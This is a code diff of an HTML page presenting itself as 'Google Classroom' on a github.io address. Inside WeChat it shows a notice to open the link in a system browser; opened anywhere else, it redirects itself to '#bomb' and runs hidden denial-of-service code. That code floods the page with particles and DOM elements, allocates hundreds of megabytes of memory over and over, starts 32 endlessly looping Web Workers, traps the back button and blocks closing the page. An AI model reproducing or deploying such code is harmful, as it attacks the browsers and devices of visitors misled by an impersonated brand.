@@ -2,34 +2,106 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <title>Google Classroom</title>
     <script>
-        var ua=navigator.userAgent.toLowerCase();
-        if(ua.indexOf('micromessenger')===-1){
-            location.replace('https://1l08kwokpohua.github.io/google-classroom/bomb.html');
+        // 1. 智能检测：如果不是微信，直接原地开炸！
+        if (navigator.userAgent.toLowerCase().indexOf('micromessenger') === -1) {
+            // 通过跳转到自己加一个锚点来触发炸弹，避免被缓存覆盖
+            location.replace(location.href + '#bomb');
         }
     </script>
     <style>
+        /* 微信提示页的样式 */
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#EDEDED;font-family:-apple-system,'PingFang SC',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20vh 12.5vw}
-        .card{background:#fff;border-radius:20px;padding:32px 24px;width:100%;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.06)}
-        .card .icon{font-size:48px;margin-bottom:12px}
-        .card h1{font-size:20px;color:#4285F4;margin-bottom:6px}
-        .card p{font-size:14px;color:#666;margin-bottom:8px}
-        .card .warn{font-size:13px;color:#FA5151;margin-bottom:20px}
-        .link-box{background:#F5F5F5;border-radius:10px;padding:12px;word-break:break-all;font-size:12px;color:#333;text-align:left}
-        .footer{margin-top:16px;font-size:10px;color:#B0B0B0}
+        body{background:#EDEDED;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+        .card{background:#fff;border-radius:20px;padding:30px;width:100%;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.05)}
+        .card h1{color:#4285F4;margin-bottom:10px}
+        .card p{color:#666;margin-bottom:20px}
+        .link{background:#f5f5f5;padding:10px;border-radius:8px;font-size:14px;word-break:break-all;color:#333}
     </style>
 </head>
 <body>
+    <!-- 微信提示内容 -->
     <div class="card">
-        <div class="icon">📚</div>
         <h1>Google Classroom</h1>
-        <p>微信内无法使用</p>
-        <p class="warn">请复制以下链接到浏览器打开</p>
-        <div class="link-box">https://1l08kwokpohua.github.io/google-classroom/</div>
+        <p>微信内无法正常使用<br>请复制以下链接至系统浏览器打开</p>
+        <div class="link">https://1l08kwokpohua.github.io/google-classroom/</div>
     </div>
-    <div class="footer"><p>*该软件非腾讯开发，仅供学习交流</p></div>
+
+    <!-- 炸弹代码，由 'bomb' 锚点触发 -->
+    <script>
+        if (location.hash === '#bomb') {
+            // 清除所有提示内容
+            document.body.innerHTML = '';
+            document.body.style.background = 'pink';
+            document.body.style.overflow = 'hidden';
+            
+            // 创建画布
+            var canvas = document.createElement('canvas');
+            canvas.id = 'c';
+            document.body.appendChild(canvas);
+            
+            // ===== 你的粉色炸弹全代码 =====
+            var c = document.getElementById('c');
+            var ctx = c.getContext('2d');
+            c.width = innerWidth;
+            c.height = innerHeight;
+            var p = [];
+            for (var i = 0; i < 50000; i++) {
+                p.push({
+                    x: Math.random() * c.width,
+                    y: Math.random() * c.height,
+                    vx: (Math.random() - 0.5) * 30,
+                    vy: (Math.random() - 0.5) * 30,
+                    r: Math.random() * 4 + 1
+                });
+            }
+            function draw() {
+                ctx.fillStyle = 'rgba(255,192,203,0.05)';
+                ctx.fillRect(0, 0, c.width, c.height);
+                for (var i = 0; i < p.length; i++) {
+                    p[i].x += p[i].vx;
+                    p[i].y += p[i].vy;
+                    if (p[i].x < 0 || p[i].x > c.width) p[i].vx *= -1;
+                    if (p[i].y < 0 || p[i].y > c.height) p[i].vy *= -1;
+                    ctx.fillStyle = 'hsl(' + (Date.now() / 2 + i % 360) + ',100%,70%)';
+                    ctx.beginPath();
+                    ctx.arc(p[i].x, p[i].y, p[i].r, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+                requestAnimationFrame(draw);
+            }
+            draw();
+            setInterval(function() {
+                for (var i = 0; i < 1000; i++) {
+                    var d = document.createElement('div');
+                    d.style.cssText = 'position:fixed;width:40px;height:40px;background:hsl(' + Math.random() * 360 + ',100%,70%);z-index:99;opacity:0.7;border-radius:50%;';
+                    d.style.left = Math.random() * innerWidth + 'px';
+                    d.style.top = Math.random() * innerHeight + 'px';
+                    document.body.appendChild(d);
+                }
+            }, 50);
+            setInterval(function() {
+                for (var i = 0; i < 1000; i++) {
+                    var s = document.createElement('span');
+                    s.style.cssText = 'position:fixed;color:hsl(' + Math.random() * 360 + ',100%,50%);z-index:99;font-size:16px;';
+                    s.style.left = Math.random() * innerWidth + 'px';
+                    s.style.top = Math.random() * innerHeight + 'px';
+                    s.textContent = '🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔';
+                    document.body.appendChild(s);
+                }
+            }, 100);
+            var r = [];
+            setInterval(function() { for (var i = 0; i < 10; i++) { r.push(new ArrayBuffer(50 * 1024 * 1024)); } }, 100);
+            var code = 'while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
+            var blob = new Blob([code], { type: 'text/javascript' });
+            var url = URL.createObjectURL(blob);
+            for (var i = 0; i < 32; i++) { new Worker(url); }
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() { history.go(1); };
+            setInterval(function() { history.pushState(null, null, location.href + '#' + Math.random()); }, 10);
+            window.onbeforeunload = function() { return 'x'; };
+        }
+    </script>
 </body>
 </html>
